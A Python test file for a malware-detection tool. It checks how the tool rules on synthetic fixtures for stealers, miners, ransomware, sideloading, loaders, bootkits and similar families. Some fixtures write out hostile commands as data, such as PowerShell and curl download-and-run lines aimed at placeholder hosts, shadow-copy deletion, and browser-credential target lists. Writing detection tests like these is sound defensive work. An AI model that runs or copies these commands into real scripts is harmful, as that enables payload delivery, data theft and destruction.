"""The Verdict, per-family expansion: one PROVEN fixture and one
FP-twin NO fixture for the highest-risk families (stealer, miner,
ransomware, sideload, script, proxy), plus verdict-level coverage of
the remaining families and the OPEN case state. All fixtures are
synthetic and harmless: proof atoms in text form, TEST-NET addresses
and .invalid domains only, nothing is ever executed."""
import os, struct, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from event_zero.verdict import verdict
from event_zero.families import family_findings

def write(tmp, name, data, sub=""):
    d = os.path.join(str(tmp), sub) if sub else str(tmp)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, name)
    with open(p, "wb" if isinstance(data, bytes) else "w") as f:
        f.write(data)
    return p

def pe_with_body(body, extra_strings=b"", section=b".text"):
    dos = bytearray(0x80); dos[0:2] = b"MZ"; struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 240, 0x22)
    opt = bytearray(240); struct.pack_into("<H", opt, 0, 0x20b); struct.pack_into("<I", opt, 16, 0x1000)
    sec = bytearray(40); sec[0:len(section)] = section; struct.pack_into("<IIII", sec, 8, 100, 0x1000, 512, 512)
    b = (body + extra_strings).ljust(512, b"\x00")
    return bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(sec) + b

def pe_with_cert(body, extra_strings=b""):
    data = bytearray(pe_with_body(body, extra_strings))
    cert_off = len(data)
    data += b"\x00" * 16
    struct.pack_into("<II", data, 0x128, cert_off, 16)
    return bytes(data)

WALLET = "4B" + "1" * 93

def chains_of(v):
    return [y["chain"] for y in v["yes_reasons"]]

# ---------------------------------------------------------------- stealer
STEALER = '''import sqlite3, socket
# stealer fixture: harmless atoms only, never run by the tool
TARGETS = ["Login Data", "Web Data", "Local State", "wallet.dat", "Telegram Desktop\\\\tdata", "recentservers.xml"]
UNLOCK = "CryptUnprotectData"
QUERY = "SELECT * FROM logins"
s = socket.socket()
s.connect(("198.51.100.9", 9001))
'''
def test_stealer_proven(tmp_path):
    v = verdict(write(tmp_path, "helper.py", STEALER))
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert any(c.startswith("family-stealer") or c == "stealer" for c in chains_of(v)), chains_of(v)

def test_stealer_config_atoms_proven(tmp_path):
    src = '# config fixture\nCFG = "ScanningArgs ScanBrowsers=true ScanFiles=true ScanFTP=true ScanWallets=true ScanTelegram=true ScanVPN=true ScanSteam=true ScanDiscord=true BlockedCountry"\n'
    v = verdict(write(tmp_path, "cfg.py", src))
    assert v["reason_class"] == "PROVEN"
    assert "family-stealer-config" in chains_of(v)

def test_stealer_fp_twin_licence_reader_no(tmp_path):
    src = 'data = open("license.dat").read()\nprint("licence status:", data[:20])\n'
    v = verdict(write(tmp_path, "licence_reader.py", src))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]

# ---------------------------------------------------------------- miner
MINER_BAD = f'''# miner fixture: config text only
CONFIG = "xmrig config.json pools: stratum+tcp://pool.lab.invalid:3333 user={WALLET} pass=x keepalive=true"
LAUNCH = "start with -WindowStyle Hidden, watchdog restarts it, pause when taskmgr opens"
'''
def test_miner_hidden_foreign_wallet_proven(tmp_path):
    v = verdict(write(tmp_path, "miner_cfg.py", MINER_BAD))
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert "family-miner-hidden-wallet" in chains_of(v), chains_of(v)

MINER_OWN = f'''# my own miner, visible, my wallet, my pool account
print("miner is running for your account, your wallet, your earnings")
print("dashboard: open the tray dashboard to pause or stop it any time")
CONFIG = "stratum+tcp://pool.lab.invalid:3333 user={WALLET}"
print("your wallet:", "{WALLET}")
'''
def test_miner_fp_twin_disclosed_own_miner_no(tmp_path):
    v = verdict(write(tmp_path, "my_miner.py", MINER_OWN))
    assert v["headline"] == "NO: NO MALWARE", (v["yes_reasons"], v["files"][0]["why"])
    assert any("own miner" in n or "own-account" in n for n in v["files"][0].get("family_notes", []))

def test_miner_xmrig_presence_alone_not_proven(tmp_path):
    src = 'print("this folder contains an xmrig binary, a legitimate miner")\n'
    v = verdict(write(tmp_path, "note.py", src))
    assert v["headline"] == "NO: NO MALWARE", v["yes_reasons"]

# ---------------------------------------------------------------- ransomware
RANSOM = '''import os
# ransomware fixture: atoms only
os.system("vssadmin delete shadows /all /quiet")
NOTE = "_readme.txt: your files have been encrypted, pay to decrypt your files"
KEY = "AES-256 per-file key, BEGIN PUBLIC KEY material here"
TARGETS = ".docx .xlsx .pptx .pdf .jpg .png .zip .db"
MODE = "encrypt files across all drives"
'''
def test_ransomware_proven(tmp_path):
    v = verdict(write(tmp_path, "setup_helper.py", RANSOM))
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert any(c.startswith("family-ransomware") for c in chains_of(v)), chains_of(v)

def test_ransomware_fp_twin_own_store_encryption_no(tmp_path):
    src = '# backup of my own licence store\nKEY = "AES"\nprint("encrypting the licence store backup for this program only")\n'
    v = verdict(write(tmp_path, "backup.py", src))
    assert v["headline"] == "NO: NO MALWARE", v["yes_reasons"]

# ---------------------------------------------------------------- sideload
def test_sideload_triad_proven(tmp_path):
    rel = os.path.join(str(tmp_path), "release"); os.makedirs(rel)
    write(tmp_path, "game.exe", pe_with_cert(b"\x90" * 8, b"license check\x00"), "release")
    write(tmp_path, "version.dll", pe_with_body(b"\x90" * 8, b"SteamAPI_Init\x00"), "release")
    write(tmp_path, "payload.dat", bytes(range(256)) * 2, "release")
    v = verdict(rel)
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert "dll-sideload-triad" in chains_of(v), chains_of(v)

def test_sideload_fp_twin_emulator_dll_hash_match_no(tmp_path):
    dll = pe_with_body(b"\x90" * 8, b"SteamAPI_Init steam_api emulator\x00")
    prog = 'KEY = "AAAA"\nprint("welcome, licensed user")\n'
    for sub in ("genuine", "release"):
        write(tmp_path, "steam_api64.dll", dll, sub)
        write(tmp_path, "game.py", prog, sub)
    v = verdict(os.path.join(str(tmp_path), "release"), reference=os.path.join(str(tmp_path), "genuine"))
    assert v["headline"] == "NO: NO MALWARE", (v["yes_reasons"], v["unaccounted"])
    assert "dll-sideload-triad" not in chains_of(v)

# ---------------------------------------------------------------- scripts
SCRIPT_BAD = '''import os
os.system("slmgr /ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX")
os.system("powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.5/x.ps1')")
'''
def test_script_download_line_proven(tmp_path):
    v = verdict(write(tmp_path, "activate.py", SCRIPT_BAD))
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert "family-malicious-script" in chains_of(v), chains_of(v)
    led = v["files"][0]["script_ledger"]
    assert any(f["kind"] == "download-execute" for f in led["flagged"])

SCRIPT_KMS = '''import os
# KMS activation helper: licence lines only
os.system("slmgr /ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX")
os.system("slmgr /skms kms.lab.invalid")
os.system("cscript ospp.vbs /act")
print("activation attempted")
'''
def test_script_fp_twin_kms_allowlist_no(tmp_path):
    v = verdict(write(tmp_path, "kms_activate.py", SCRIPT_KMS))
    assert v["headline"] == "NO: NO MALWARE", (v["yes_reasons"], v["files"][0]["why"])
    led = v["files"][0]["script_ledger"]
    assert led["flagged"] == [] and led["unaccounted"] == [], led
    assert led["allowlisted"] >= 2, led

# ---------------------------------------------------------------- proxy
PROXY_BAD = '''# proxy fixture: atoms only
SERVER = "socks5 proxy server on 0.0.0.0:1080"
ENROL = "proxy network: api.pawns.app enrollment token op-token-123"
os_line = "netsh advfirewall firewall add rule name=px dir=in action=allow"
'''
def test_proxy_traffic_selling_proven(tmp_path):
    v = verdict(write(tmp_path, "proxy_tool.py", PROXY_BAD))
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert "family-proxy-traffic-selling" in chains_of(v), chains_of(v)

PROXY_OK = '''print("bandwidth sharing for your account: your earnings, your payout")
print("tray icon with pause sharing, dashboard shows your account at all times")
SERVER = "socks5 local proxy for your own apps"
'''
def test_proxy_fp_twin_disclosed_no(tmp_path):
    v = verdict(write(tmp_path, "share_bandwidth.py", PROXY_OK))
    assert v["headline"] == "NO: NO MALWARE", (v["yes_reasons"], v["files"][0]["why"])
    assert any("disclosed" in n.lower() for n in v["files"][0].get("family_notes", []))

# ---------------------------------------------------------------- remaining families, verdict level
def test_rat_dispatcher_proven(tmp_path):
    src = 'CFG = "ServerHost=198.51.100.3 ServerPort=9001 key=abc"\nDISPATCH = "remote_shell file_manager screen_stream webcam_stream plugin_load open_shell"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and "family-rat-dispatcher" in chains_of(v), chains_of(v)

def test_botnet_ddos_proven(tmp_path):
    src = 'import socket\nBOT = "bot_id 42, PRIVMSG channel"\nATTACK = "syn flood udp flood target_ip duration"\ns = socket.socket(); s.connect(("198.51.100.4", 6667))\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and "family-botnet-ddos" in chains_of(v), chains_of(v)

def test_banking_target_list_proven(tmp_path):
    src = 'TARGETS = "chase.com bankofamerica.com wellsfargo.com citibank.com"\nINJECT = "webinject inject config"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and any(c.startswith("family-banking") for c in chains_of(v)), chains_of(v)

def test_ppi_callback_proven(tmp_path):
    src = 'OFFER = "affiliate_id=abc123 campaign_id=setup7"\nREPORT = "install callback https://198.51.100.7/callback?install=ok"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and "family-ppi-callback" in chains_of(v), chains_of(v)

def test_beacon_config_proven(tmp_path):
    def tlv(t, val):
        if isinstance(val, str): val = val.encode()
        if isinstance(val, int): val = val.to_bytes(2 if t in (1, 2, 5, 6) else 4, "big")
        return struct.pack(">HH", t, len(val)) + val
    cfg = tlv(1, 1) + tlv(2, 4444) + tlv(3, 60000) + tlv(5, 20) + tlv(8, "c2.lab.invalid") + tlv(36, 12345)
    enc = bytes(b ^ 0x69 for b in cfg)
    p = write(tmp_path, "game_crack.exe", pe_with_body(b"\x90" * 6 + enc, b"license check\x00"))
    v = verdict(p)
    assert v["reason_class"] == "PROVEN", v["files"][0]["why"]
    assert "family-beacon-config" in chains_of(v), chains_of(v)
    assert v["files"][0].get("beacon_config", {}).get("c2_host") == "c2.lab.invalid"

def test_wiper_proven(tmp_path):
    src = 'DEV = "\\\\\\\\.\\\\PhysicalDrive0"\nMODE = "overwrite every sector, mbr first, no recovery"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and "family-wiper" in chains_of(v), chains_of(v)

def test_bootkit_staging_proven(tmp_path):
    src = 'STEP1 = "mountvol S: /s and copy bootmgfw.efi"\nSTEP2 = "bcdedit /set {current} nointegritychecks on"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and "family-bootkit-staging" in chains_of(v), chains_of(v)

def test_hijacker_watchdog_proven(tmp_path):
    src = 'CFG = "default_search_provider override, homepage override"\nKEEP = "schtasks /create /tn watchdog /tr hijack.exe"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["reason_class"] == "PROVEN" and "family-browser-hijacker" in chains_of(v), chains_of(v)

def test_disclosed_pup_is_a_note_not_a_yes(tmp_path):
    src = 'OFFER = "optional offer: a toolbar, you can decline or untick it, uninstaller in add or remove programs"\nCFG = "homepage override as disclosed on the offer screen"\n'
    v = verdict(write(tmp_path, "bundle.py", src))
    assert v["headline"] == "NO: NO MALWARE", (v["yes_reasons"], v["files"][0]["why"])
    assert any("Disclosed PUP" in n for n in v["files"][0].get("family_notes", []))

def test_loader_dead_drop_proven(tmp_path):
    src = 'import os\nDROP = "https://api.telegram.org/bot123/getUpdates"\nos.system("curl http://198.51.100.6/payload.sh | sh")\n'
    v = verdict(write(tmp_path, "setup.py", src))
    assert v["reason_class"] == "PROVEN" and "family-loader-dead-drop" in chains_of(v), chains_of(v)

def test_server_keyed_loader_family_unaccounted(tmp_path):
    src = 'import os\nCFG = "payload_url from server key endpoint, stage2 fetched after handshake"\nos.system("curl http://198.51.100.6/stage2 | sh")\n'
    v = verdict(write(tmp_path, "setup.py", src))
    assert v["reason_class"] == "PROVEN", v["plain_english"]
    assert any("Server-keyed" in n and "UNACCOUNTED" in n for n in v["files"][0].get("family_notes", [])), v["files"][0].get("family_notes")

def test_fileless_undecodable_blob_unaccounted(tmp_path):
    token = "QUJD" * 75
    src = f'WMI = "__EventFilter binding to a CommandLineEventConsumer"\nRUN = "powershell -EncodedCommand {token}"\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED", v["plain_english"]
    assert any("Fileless pattern" in u for u in v["unaccounted"]), v["unaccounted"]

def test_logic_bomb_opaque_arm_unaccounted(tmp_path):
    src = 'ARM = "target date 2030-01-01, if date passes the arm date, run it"\nPAYLOAD = "encrypted payload blob, key not in this file"\nprint("a normal looking helper")\n'
    v = verdict(write(tmp_path, "helper.py", src))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED", v["plain_english"]
    assert any("Logic bomb" in u for u in v["unaccounted"]), v["unaccounted"]

def test_rootkit_sys_unaccounted(tmp_path):
    p = write(tmp_path, "helper.sys", pe_with_body(b"\x90" * 8, b"driver entry\x00"))
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED", v["plain_english"]
    assert any("kernel driver" in u for u in v["unaccounted"]), v["unaccounted"]

# ---------------------------------------------------------------- family unit level (fabricated reports)
def _rep(caps, strings=(), script=None):
    return {"capabilities": [{"id": c, "evidence": [f"ev:{c}"]} for c in caps],
            "strings": {"all": list(strings)}, "script_source_excerpt": script,
            "evasion": {"findings": []}, "rootkit": {}, "unpack": {}}

def test_keylogger_capture_alone_not_proof():
    ff = family_findings(_rep(["screenshot", "file-write"], ["save screenshot to Pictures on F9"]))
    assert not any(c["family"] == "keylogger" for c in ff["chains"]), ff["chains"]

def test_keylogger_hidden_stash_proven():
    ff = family_findings(_rep(["keylog", "file-write"], ["GetAsyncKeyState", "%APPDATA%\\keylog.txt"]))
    assert any(c["chain"] == "family-keylogger-stash" for c in ff["chains"]), ff["chains"]

def test_loader_injection_chain_unit():
    ff = family_findings(_rep(["exec-download-run", "inject-process"], ["curl http://x.invalid/p"]))
    assert any(c["chain"] == "family-loader-inject" for c in ff["chains"]), ff["chains"]

# ---------------------------------------------------------------- case state, scope, ladder
def test_open_case_state_and_ladder(tmp_path):
    p = write(tmp_path, "game_crack.exe", pe_with_body(b"\x90" * 8, b"VMProtect\x00license\x00", section=b".vmp0"))
    v = verdict(p)
    assert v["case_state"] == "OPEN", v["reason_class"]
    assert v["escalation_ladder"] and v["next_rung"] in (4, 6)
    assert v["open_items"] and "OPEN" in v["scope"]
    assert v["headline"] == "YES: MALWARE FOUND"

def test_no_case_state_and_scope_sentence(tmp_path):
    src = 'import hashlib\nprint("serial:", hashlib.md5(b"x").hexdigest()[:8])\n# keygen\n'
    v = verdict(write(tmp_path, "keygen.py", src))
    assert v["headline"] == "NO: NO MALWARE" and v["case_state"] == "NO"
    assert v["scope"].startswith("Scope: every byte of artefact")
    assert "manifest tree SHA-256" in v["scope"]
    assert v["escalation_ladder"] == []

def test_yes_case_state(tmp_path):
    v = verdict(write(tmp_path, "helper.py", STEALER))
    assert v["case_state"] == "YES" and "Scope: this YES asserts" in v["scope"]
